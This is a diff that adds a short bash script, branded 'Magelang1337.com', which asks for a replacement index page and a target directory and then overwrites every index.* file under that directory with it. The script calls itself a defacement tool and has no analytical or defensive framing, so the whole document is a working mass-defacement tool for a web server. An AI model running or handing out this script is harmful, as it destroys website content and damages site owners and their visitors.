@@ -1,0 +1,12 @@
+#!/bin/bash
+echo '################ Magelang1337.com ###########################'
+echo '[+] your index path on the server'
+read index 
+echo
+echo '[+] enter the path To deface '
+read path
+echo
+echo '[+] Starting ........'
+find $path -name "index.*" -exec cp $index {} \;
+echo 
+echo '[+] Done !'
